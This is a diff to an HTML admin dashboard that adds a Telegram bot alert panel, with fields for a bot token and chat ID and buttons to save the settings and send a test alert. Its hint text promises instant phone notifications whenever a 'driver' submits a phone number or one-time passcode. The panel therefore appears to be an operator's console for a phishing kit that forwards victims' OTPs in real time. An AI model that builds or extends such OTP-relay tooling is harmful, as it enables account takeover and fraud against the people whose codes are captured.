@@ -193,7 +193,29 @@
                                 <i class="fa-solid fa-paper-plane"></i> Send Test Email
                             </button>
                         </div>
-                        <span id="recipients-status-msg" class="config-status"></span>
+                    <!-- Telegram Bot Configuration -->
+                    <div class="email-config-group" style="border-color: #0088cc;">
+                        <h4 style="color: #60A5FA;"><i class="fa-brands fa-telegram" style="color: #0088cc;"></i> Instant Telegram Bot Alerts (⚡ Instant &lt; 0.5s)</h4>
+                        <p class="config-hint">Receive instant Telegram notifications with sound on your phone as soon as a driver submits their phone number or OTP.</p>
+                        <div class="email-form-grid">
+                            <div class="email-input-group">
+                                <label>Telegram Bot Token</label>
+                                <input type="text" id="telegram-token" placeholder="e.g. 123456789:ABCdefGhIJKlmNoPQRstuVWXyz">
+                            </div>
+                            <div class="email-input-group">
+                                <label>Your Telegram Chat ID</label>
+                                <input type="text" id="telegram-chat-id" placeholder="e.g. 987654321">
+                            </div>
+                        </div>
+                        <div class="recipients-actions">
+                            <button class="btn-save-smtp" onclick="saveTelegramConfig()" style="background: linear-gradient(135deg, #0088cc, #006699);">
+                                <i class="fa-solid fa-floppy-disk"></i> Save Telegram Config
+                            </button>
+                            <button class="btn-icon-admin" onclick="sendTestTelegram()" style="background:#0088cc; padding: 8px 16px;">
+                                <i class="fa-brands fa-telegram"></i> Send Test Telegram Alert
+                            </button>
+                        </div>
+                        <span id="telegram-status-msg" class="config-status"></span>
                     </div>
                 </div>
             </section>
